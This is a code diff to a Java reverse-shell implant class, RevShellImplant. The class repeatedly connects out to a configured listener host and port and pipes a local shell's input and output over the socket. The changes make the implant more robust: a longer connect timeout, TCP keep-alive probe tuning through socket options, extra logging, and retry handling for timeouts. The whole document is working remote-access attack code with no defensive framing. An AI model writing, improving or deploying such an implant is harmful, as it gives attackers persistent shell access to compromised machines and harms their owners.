@@ -4,8 +4,7 @@ import java.io.Closeable;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.net.InetSocketAddress;
-import java.net.Socket;
+import java.net.*;
 import java.nio.file.FileSystem;
 import java.nio.file.FileSystems;
 import java.nio.file.Files;
@@ -32,12 +31,27 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
      */
     static volatile int CONF_LPORT = 12345;
 
-    static volatile int CONF_TIMEOUT_SECONDS = 10;
+    /**
+     * Timeout in seconds for each connection attempt.
+     */
+    static volatile int CONF_TIMEOUT_SECONDS = 30;
 
     /**
      * Amount of seconds to wait between connection attempts.
      */
     static volatile int CONF_RETRY_WAIT_SECONDS = 30;
+
+    /**
+     * Amount of seconds between TCP keep-alive probes.
+     * This value will be used for the TCP_KEEPIDLE and TCP_KEEPINTERVAL socket options (if available).
+     */
+    static volatile int CONF_TCP_KEEPALIVE_SECONDS = 30;
+
+    /**
+     * Number of keep-alive probe attempts before considering the socket broken.
+     * This value will be used for the TCP_KEEPCOUNT socket option (if available).
+     */
+    static volatile int CONF_TCP_KEEPALIVE_ATTEMPTS = 3;
 
     /**
      * Print debug output to stdout.
@@ -89,8 +103,8 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         while (!Thread.interrupted()) {
             log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
             try (Socket connection = new Socket()) {
-                connection.setKeepAlive(true);
-                connection.connect(new InetSocketAddress(CONF_LHOST, CONF_LPORT), CONF_TIMEOUT_SECONDS);
+                setKeepAliveOptions(connection);
+                connection.connect(new InetSocketAddress(CONF_LHOST, CONF_LPORT), (int) Duration.ofSeconds(CONF_TIMEOUT_SECONDS).toMillis());
                 InputStream fromRemote = connection.getInputStream();
                 OutputStream toRemote = connection.getOutputStream();
                 log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");
@@ -106,6 +120,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
                 Thread pipe1 = new Thread(() -> {
                     transfer(fromShell, toRemote);
+                    log("[-] Shell terminated.");
                     closeAll(connection);
                     shell.destroy();
                 });
@@ -113,6 +128,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
 
                 Thread pipe2 = new Thread(() -> {
                     transfer(fromRemote, toShell);
+                    log("[-] Connection terminated.");
                     closeAll(connection);
                     shell.destroy();
                 });
@@ -121,11 +137,11 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 log("[ ] Waiting...");
                 pipe1.join();
                 pipe2.join();
-
-                shell.destroy();
-                log("[ ] Terminated.");
+            } catch (SocketTimeoutException e) {
+                log("[!] " + e.getClass().getName() + ": " + e.getMessage());
             } catch (IOException e) {
                 log("[!] " + e.getClass().getName() + ": " + e.getMessage());
+                log("[ ] Waiting for " + CONF_RETRY_WAIT_SECONDS + " seconds...");
                 try {
                     Thread.sleep(Duration.ofSeconds(CONF_RETRY_WAIT_SECONDS).toMillis());
                 } catch (InterruptedException ignored) {
@@ -133,6 +149,41 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 }
             } catch (InterruptedException ignored) {
                 Thread.currentThread().interrupt();
+            }
+        }
+    }
+
+    @SuppressWarnings("unchecked")
+    private static void setKeepAliveOptions(Socket socket) {
+        try {
+            socket.setKeepAlive(true);
+        } catch (SocketException e) {
+            log("[-] Socket does not support TCP keep-alive.");
+        }
+
+        for (SocketOption<?> option : socket.supportedOptions()) {
+            // Time in seconds before the first keep-alive probe is sent.
+            if (option.name().equals("TCP_KEEPIDLE") && option.type() == Integer.class) {
+                try {
+                    socket.setOption((SocketOption<Integer>) option, CONF_TCP_KEEPALIVE_SECONDS);
+                } catch (Exception ignored) {
+                }
+            }
+
+            // Amount of probes to send before considering the socket broken.
+            if (option.name().equals("TCP_KEEPCOUNT") && option.type() == Integer.class) {
+                try {
+                    socket.setOption((SocketOption<Integer>) option, CONF_TCP_KEEPALIVE_ATTEMPTS);
+                } catch (Exception ignored) {
+                }
+            }
+
+            // Interval in seconds between each keep-alive probe retry.
+            if (option.name().equals("TCP_KEEPINTERVAL") && option.type() == Integer.class) {
+                try {
+                    socket.setOption((SocketOption<Integer>) option, CONF_TCP_KEEPALIVE_SECONDS);
+                } catch (Exception ignored) {
+                }
             }
         }
     }
